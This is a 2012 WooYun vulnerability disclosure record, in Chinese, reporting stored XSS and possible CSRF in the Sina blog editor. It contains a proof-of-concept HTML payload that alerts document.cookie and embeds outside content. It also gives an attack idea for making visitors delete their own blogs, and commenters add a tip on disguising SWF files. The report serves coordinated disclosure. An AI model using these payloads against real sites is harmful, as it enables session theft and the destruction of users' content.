{"id": 19190, "wybug_id": "wooyun-2012-07519", "wybug_title": "sina博客xss+csrf", "wybug_corp": "新浪", "wybug_author": "random_", "wybug_date": "2012-05-25 12:39", "wybug_open_date": "2012-07-09 12:40", "wybug_type": "xss跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "3", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-05-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-05-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-06-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-06-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-06-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-07-09：\t细节向公众公开  简要描述： allowScriptAccess有三个值，取sameDomain时是 AllowScriptAccess 的默认值。 详细说明：  allowScriptAccess有三个值，取sameDomain时是 AllowScriptAccess 的默认值。使用此设置，或者不设置，插入的媒体可以调用同域的资源：js,swf等。如果找到合适的js，就可以做意想不到的事了，如CSRF。   漏洞证明：  1. 这是sina博客的编辑器，源码模式可以插入代码，测试代码：\n<embed src=\"http://tmxk.org\" /><a href=\"http://tmxk.org\">http://tmxk.org</a><span onmouseover=\"javascript:alert(document.cookie)\">alert(document.cookie)</span><img href=\"javascript:alert()\" /> <iframe src=\"http://tmxk.org\"></iframe><form>        <input type=\"text\" /></form><>\n预览效果(未保存)：\n\n保存后(遨游浏览器)：\n\n插入了一个聊天室：http://blog.sina.com.cn/u/2778335652\n\n2. 利用思路：插入别人的sina博客,可以是n多，调用删博客代码(或者别的sina自带js，如转发)，他来访问，他有权限，就删了他自己的博客。   修复方案：  这个csrf我自己还未证明，关键是怎么对待AllowScriptAccess=\"samedomain\"，反正网易的是AllowScriptAccess=\"never\"，仅供参考。   版权声明：转载请注明来源 random_@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2012-05-25 15:40 厂商回复： 感谢提供，与浏览器有直接关系 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-05-29 12:32 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  AllowScriptAccess=\"samedomain\"，这里有个tips，embed标签解析swf文件的时候，是可以不考虑后缀的，比如jpg，gif，只要文件本身是swf文件就可以，so，，仅做为提示吧。    \n     2012-06-05 19:18 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  embed不设置allowscriptaccess就挺危险的，  embed插入网页的这个，在不少编辑器里是被忽视的，随着现在webkit内核的浏览器份额的增大，包括国内各种双核浏览器。危害还是挺明显的。    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}